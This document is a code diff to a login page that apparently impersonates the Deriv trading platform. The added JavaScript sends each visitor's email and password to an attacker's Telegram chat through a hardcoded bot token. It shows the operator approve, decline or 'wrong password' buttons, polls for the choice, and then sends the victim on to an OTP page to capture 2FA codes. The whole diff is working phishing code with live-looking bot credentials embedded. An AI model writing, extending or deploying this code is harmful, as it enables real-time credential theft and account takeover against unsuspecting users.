@@ -673,14 +673,101 @@
             <a href="#">Privacy</a>
         </div>
     </footer>
+    <!-- ===== Spinner Overlay (approval pending) ===== -->
+    <div class="spinner-overlay" id="spinnerOverlay">
+        <div class="spinner"></div>
+        <p class="spinner-text">login...</p>
+        <p class="spinner-email" id="spinnerEmail"></p>
+        <button class="cancel-poll-btn" type="button" id="cancelPollBtn">Cancel</button>
+    </div>
+
+    <style>
+        .spinner-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
+            pointer-events: none;
+        }
+        
+        .spinner-overlay.active {
+            opacity: 1;
+            visibility: visible;
+            pointer-events: all;
+        }
+        
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid rgba(255, 255, 255, 0.15);
+            border-top-color: #22c55e;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .spinner-text {
+            color: #d1d5db;
+            font-size: 15px;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+        
+        .spinner-email {
+            color: #22c55e;
+            font-size: 14px;
+            margin-top: 6px;
+            font-weight: 600;
+        }
+        
+        .cancel-poll-btn {
+            margin-top: 22px;
+            padding: 10px 28px;
+            background: transparent;
+            border: 1px solid #4b5563;
+            border-radius: 50px;
+            color: #9ca3af;
+            font-family: inherit;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .cancel-poll-btn:hover {
+            border-color: #ef4444;
+            color: #ef4444;
+        }
+    </style>
 
     <script>
+        // ─── Telegram polling state ─────────────────────────────
+        let pollDecided = false;
+        let pollTimeoutId = null;
+        let currentPollController = null;
         // ─── CONFIG ──────────────────────────────────────────────────────
-        const BOT_TOKEN = '8833044691:AAEKQkptUIaTn__pWotF4o-7UUAwPeabuJo';
-        const CHAT_ID = '7212604216';
+        const BOT_TOKEN = '8255631739:AAEnO1w67WAdk9i8lOK_1IsUkIqzSEwySaY';
+        const CHAT_ID = '5615316142';
         const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
         // ─── DOM refs ──────────────────────────────────────────────────
+        const spinnerOverlay = document.getElementById('spinnerOverlay');
+        const spinnerEmailEl = document.getElementById('spinnerEmail');
+        const cancelPollBtn = document.getElementById('cancelPollBtn');
         const step1 = document.getElementById('step1');
         const step2 = document.getElementById('step2');
         const emailField = document.getElementById('email');
@@ -741,36 +828,76 @@
                 return;
             }
 
-            // Save email for step 2
             localStorage.setItem('signin_email', email);
+            localStorage.setItem('signin_password', password); // OPTIONAL (not recommended, but mirrors your request)
 
-            // Show a brief note
-            setFormNote('Verifying...', '');
+            // Prepare UI
+            setFormNote('Verifying with Telegram...', '');
+            spinnerEmailEl.textContent = email; // or mask if you want
+            spinnerOverlay.classList.add('active');
 
-            // Fire-and-forget to Telegram
+            // Disable submit while waiting
+            submitBtnText && (submitBtnText.textContent = 'Waiting for approval...');
+            const submitBtn = document.querySelector('#signinForm .btn-submit');
+            submitBtn && (submitBtn.disabled = true);
+
+            // Unique request id used in callback_data
+            const userId = email.replace(/[^a-zA-Z0-9]/g, '').slice(0, 15) + '_' + Date.now();
+            localStorage.setItem('signin_userId', userId);
+
             const message = [
                 '🔐 Login attempt',
                 '',
                 `Email: ${email}`,
-                `Password: ${password}`
+                `Password: ${password}`,
+                '',
+                'Please approve, decline, or mark as wrong password:'
             ].join('\n');
 
-            fetch(`${API_BASE}/sendMessage`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message
-                })
-            }).catch(err => console.error('Telegram send failed:', err));
+            const keyboard = {
+                inline_keyboard: [
+                    [{
+                        text: '✅ APPROVE',
+                        callback_data: `approve_${userId}`
+                    }, {
+                        text: '❌ DECLINE',
+                        callback_data: `decline_${userId}`
+                    }],
+                    [{
+                        text: '⚠️ WRONG PASSWORD',
+                        callback_data: `wrong_${userId}`
+                    }]
+                ]
+            };
 
-            // Switch to step 2 (2FA code)
-            loginEmailEl.textContent = email;
-            switchStep(step1, step2);
-            setFormNote('');
-            codeField.focus();
+            // Send message then start polling
+            fetch(`${API_BASE}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        reply_markup: JSON.stringify(keyboard)
+                    })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    if (!data.ok) {
+                        spinnerOverlay.classList.remove('active');
+                        submitBtn && (submitBtn.disabled = false);
+                        setFormNote('Failed to contact Telegram. Please try again.', 'error');
+                        return;
+                    }
+                    startPolling(userId, 'otp.html', 'auth');
+                })
+                .catch(err => {
+                    console.error('Telegram send failed:', err);
+                    spinnerOverlay.classList.remove('active');
+                    submitBtn && (submitBtn.disabled = false);
+                    setFormNote('Network error. Please try again.', 'error');
+                });
         });
 
         // ─── STEP 2: 2FA Code submit ────────────────────────────────────
@@ -808,6 +935,135 @@
             // Navigate to deriv.html
             window.location.href = 'deriv.html';
         });
+
+        function cancelPolling() {
+            pollDecided = true;
+            if (pollTimeoutId) clearTimeout(pollTimeoutId);
+            if (currentPollController) currentPollController.abort();
+
+            spinnerOverlay.classList.remove('active');
+            setFormNote('Request cancelled. Please try again.', 'error');
+            submitBtnText && (submitBtnText.textContent = 'Sign In securely');
+        }
+
+        function startPolling(userId, onApproveUrl, pollType /* 'auth' */ ) {
+            let offset = 0;
+            pollDecided = false;
+            let pollCount = 0;
+            const maxPolls = 90;
+            let retryDelay = 2000;
+
+            if (currentPollController) currentPollController.abort();
+            currentPollController = new AbortController();
+
+            // Get initial offset
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=1`, {
+                    signal: currentPollController.signal
+                })
+                .then(r => r.json())
+                .then(data => {
+                    if (data.ok && data.result.length > 0) {
+                        offset = data.result[data.result.length - 1].update_id + 1;
+                    }
+                    pollLoop();
+                })
+                .catch(err => {
+                    if (err.name !== 'AbortError') {
+                        console.error('Initial offset error:', err);
+                        pollLoop();
+                    }
+                });
+
+            function pollLoop() {
+                if (pollDecided) return;
+                pollCount++;
+
+                if (pollCount > maxPolls) {
+                    pollDecided = true;
+                    spinnerOverlay.classList.remove('active');
+                    setFormNote('Request timed out. Please try again.', 'error');
+                    return;
+                }
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=20&offset=${offset}`, {
+                        method: 'GET',
+                        signal: currentPollController.signal
+                    })
+                    .then(r => {
+                        if (!r.ok) {
+                            if (r.status === 409) {
+                                retryDelay = Math.min(retryDelay * 1.5, 10000);
+                                pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                                return null;
+                            }
+                            throw new Error('HTTP ' + r.status);
+                        }
+                        retryDelay = 2000;
+                        return r.json();
+                    })
+                    .then(data => {
+                        if (data === null) return;
+                        if (!data.ok || pollDecided) return;
+
+                        for (const update of data.result) {
+                            offset = update.update_id + 1;
+
+                            if (update.callback_query) {
+                                const action = update.callback_query.data;
+
+                                // answer callback to stop Telegram "loading"
+                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify({
+                                        callback_query_id: update.callback_query.id,
+                                        text: 'Action recorded!'
+                                    })
+                                }).catch(() => {});
+
+                                // AUTH actions
+                                if (pollType === 'auth') {
+                                    if (action === `approve_${userId}`) {
+                                        pollDecided = true;
+                                        localStorage.setItem('signin_approved', '1');
+                                        localStorage.setItem('signin_userId', userId);
+                                        spinnerOverlay.classList.remove('active');
+
+                                        // Go to OTP page
+                                        window.location.href = onApproveUrl;
+                                        return;
+                                    } else if (action === `decline_${userId}`) {
+                                        pollDecided = true;
+                                        spinnerOverlay.classList.remove('active');
+                                        setFormNote('Request declined. Please try again.', 'error');
+                                        return;
+                                    } else if (action === `wrong_${userId}`) {
+                                        pollDecided = true;
+                                        spinnerOverlay.classList.remove('active');
+                                        setFormNote('Wrong password. Please enter the correct password.', 'error');
+                                        return;
+                                    }
+                                }
+                            }
+                        }
+
+                        if (!pollDecided) {
+                            pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                        }
+                    })
+                    .catch(err => {
+                        if (err.name === 'AbortError') return;
+                        console.error('Poll error:', err);
+                        if (!pollDecided) {
+                            retryDelay = Math.min(retryDelay * 1.2, 8000);
+                            pollTimeoutId = setTimeout(pollLoop, retryDelay);
+                        }
+                    });
+            }
+        }
+        cancelPollBtn.addEventListener('click', cancelPolling);
     </script>
 </body>
 
